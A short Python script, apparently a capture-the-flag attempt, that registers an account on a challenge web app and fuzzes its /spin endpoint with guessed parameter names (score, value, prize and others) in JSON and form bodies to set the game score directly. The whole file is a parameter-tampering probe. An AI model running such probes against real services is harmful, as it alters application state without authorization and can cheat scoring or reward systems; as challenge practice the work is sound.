import requests

base = 'https://web-random-cheese.tracebash.xyz'
s = requests.Session()
s.post(f'{base}/register', data={'username': 'fix99', 'password': 'fix99'}, allow_redirects=False)
s.post(f'{base}/login', data={'username': 'fix99', 'password': 'fix99'}, allow_redirects=False)

# Try various params to set the value directly instead of random
for param in ['val', 'value', 'score', 'add', 'total', 'random', 'prize', 'result']:
    for payload_type in ['json', 'form']:
        s2 = requests.Session()
        s2.cookies['session'] = s.cookies.get('session')
        if payload_type == 'json':
            r = s2.post(f'{base}/spin', json={param: 100})
        else:
            r = s2.post(f'{base}/spin', data={param: 100})
        try:
            j = r.json()
            if j.get('score', 0) > 100:
                print(f'Found! {payload_type}/{param}: {j}')
        except:
            pass

print('Checking response format...')
r = s.post(f'{base}/spin')
print(r.text)